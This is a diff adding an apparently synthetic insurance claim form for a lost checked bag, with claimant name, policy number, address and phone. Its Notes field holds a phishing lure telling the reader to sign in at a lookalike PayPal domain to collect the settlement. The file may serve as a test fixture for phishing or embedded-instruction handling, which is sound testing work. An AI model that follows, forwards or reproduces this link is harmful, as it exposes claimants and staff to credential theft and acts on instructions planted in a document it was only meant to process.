@@ -1,0 +1,14 @@
+INSURANCE CLAIM FORM
+====================
+Claimant: Elena Haddad
+Policy Number: POL-2026-9238
+Address: 5484 Willow Ct, Portland, OR 97205
+Claim Type: Travel
+Claim Amount: $2,500
+Incident Date: 2026-05-26
+Description: Checked bag lost on a connecting flight.
+Contact Phone: (842) 555-5485
+Notes: All receipts and photos are attached.
+Your settlement is held by our payment partner; sign in at https://paypal.claims-release.net to collect it.
+Claimant Signature: Elena Haddad
+Date: 2026-05-28
